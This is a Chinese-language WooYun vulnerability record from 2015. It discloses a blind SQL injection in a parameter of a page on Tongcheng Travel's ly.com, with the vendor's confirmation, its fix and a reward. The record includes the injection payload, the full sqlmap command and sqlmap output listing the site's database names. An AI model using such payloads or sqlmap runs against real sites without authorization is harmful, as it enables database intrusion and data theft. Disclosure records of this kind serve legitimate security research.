{"id": 46723, "wybug_id": "wooyun-2015-097420", "wybug_title": "同程旅游网主站某处SQL注入（二）", "wybug_corp": "苏州同程旅游网络科技有限公司", "wybug_author": "xhc39", "wybug_date": "2015-02-15 17:53", "wybug_open_date": "2015-02-16 14:41", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 这次真是主站的注入... 详细说明：  http://www.ly.com/dujia/AjaxCallNew.aspx?type=GetNewVisaCountryUrl1&cityname=%E6%97%A5%E6%9C%AC&citytype=314&locality=6&iid=0.9027713068830946 的 cityname参数存在布尔盲注，可跑出数据库。payload:  cityname=%E6%97%A5%E6%9C%AC'%20and%20'1'='1   漏洞证明：  \nroot@kali:~/Desktop/sqlmapdir# sqlmap -u \"http://www.ly.com/dujia/AjaxCallNew.aspx?type=GetNewVisaCountryUrl1&cityname=%E6%97%A5%E6%9C%AC&citytype=314&locality=6&iid=0.9027713068830946\" -p cityname --prefix \"%E6%97%A5%E6%9C%AC'\" --suffix \"and '1'='1\" --delay=3 --technique=B --time-sec=20 --dbs    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 16:33:53[16:33:53] [INFO] testing connection to the target URL[16:33:57] [INFO] testing if the target URL is stable. This can take a couple of seconds[16:34:01] [INFO] target URL is stable[16:34:04] [INFO] testing for SQL injection on GET parameter 'cityname'[16:34:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[16:34:13] [INFO] GET parameter 'cityname' seems to be 'AND boolean-based blind - WHERE or HAVING clause' injectable [16:34:35] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Microsoft SQL Server' do you want to include all tests for 'Microsoft SQL Server' extending provided level (1) and risk (1)? [Y/n] y[16:35:08] [INFO] checking if the injection point on GET parameter 'cityname' is a false positiveGET parameter 'cityname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 15 HTTP(s) requests:---Place: GETParameter: cityname    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=GetNewVisaCountryUrl1&cityname=%E6%97%A5%E6%9C%AC' AND 4527=4527 and '1'='1&citytype=314&locality=6&iid=0.9027713068830946---[16:35:35] [INFO] testing MySQL[16:35:38] [WARNING] the back-end DBMS is not MySQL[16:35:38] [INFO] testing Oracle[16:35:41] [WARNING] the back-end DBMS is not Oracle[16:35:41] [INFO] testing PostgreSQL[16:35:44] [WARNING] the back-end DBMS is not PostgreSQL[16:35:44] [INFO] testing Microsoft SQL Server[16:35:48] [INFO] confirming Microsoft SQL Server[16:36:03] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET 4.0.30319, Microsoft IIS 7.5, ASP.NETback-end DBMS: Microsoft SQL Server 2008[16:36:03] [INFO] fetching database names[16:36:03] [INFO] fetching number of databases[16:36:03] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[16:36:03] [INFO] retrieved: [16:36:16] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[16:36:16] [ERROR] unable to retrieve the number of databases[16:36:16] [INFO] retrieved: TCCline[16:39:37] [INFO] retrieved: master[16:42:18] [INFO] retrieved: tempdb[16:44:57] [INFO] retrieved: model[16:47:17] [INFO] retrieved: msdb[16:49:11] [INFO] retrieved: 17u_net[16:52:15] [INFO] retrieved: ipdata[16:54:51] [INFO] retrieved: TCb2cBlog[16:58:47] [INFO] retrieved: TCB2cWenDa[17:03:04] [INFO] retrieved: TCHotelFinance[17:08:50] [INFO] retrieved: TCCline[17:11:53] [INFO] retrieved: TCCLineResource[17:18:07] [INFO] retrieved: TCEbook[17:21:06] [INFO] retrieved: TCFly[17:23:26] [INFO] retrieved: TCFlyUtility[17:28:28] [INFO] retrieved: TCHotel[17:31:39] [INFO] retrieved:  available databases [15]:[*] 17u_net[*] ipdata[*] master[*] model[*] msdb[*] TCb2cBlog[*] TCB2cWenDa[*] TCCline[*] TCCLineResource[*] TCEbook[*] TCFly[*] TCFlyUtility[*] TCHotel[*] TCHotelFinance[*] tempdb[17:32:27] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/www.ly.com'[*] shutting down at 17:32:27\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 xhc39@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-15 18:05 厂商回复： 感谢关注同程旅游，晚上给你发红包~ 最新状态： 2015-02-16：公开公开  ", "replys": "漏洞评价：\n评论\n     2015-02-15 18:33 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @xhc39 @苏州同程旅游网络科技有限公司  恭喜发财，红包拿来    \n     2015-02-15 22:25 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @xhc39 200元支付宝红包已发~@BMa 红包提交漏洞就有 哈    \n     2015-02-15 22:56 |    \t\txhc39 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:2        | ...)\t\t \n  已收，赞~    \n     2015-02-16 08:43 |    \t\tNicky \t\t\t( 普通白帽子  |\t\t\t        Rank:477 漏洞数:69        | http://www.droidsec.cn 安卓安全中文站)\t\t \n  @苏州同程旅游网络科技有限公司 哈哈 提过低危也有么    \n     2015-02-16 09:44 |    \t\t苏州同程旅游网络科技有限公司(乌云厂商)\t\t \n  @Nicky 请看那一条的厂商回复，那些都是系统扫描出来的报告直接贴过来的吧。不谈低危高危，不是你自己独立发现的啊。我之前也内部发给开发了，但是APP修复上线是有个周期的。以上，抱歉，不过无论如何，感谢关注。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}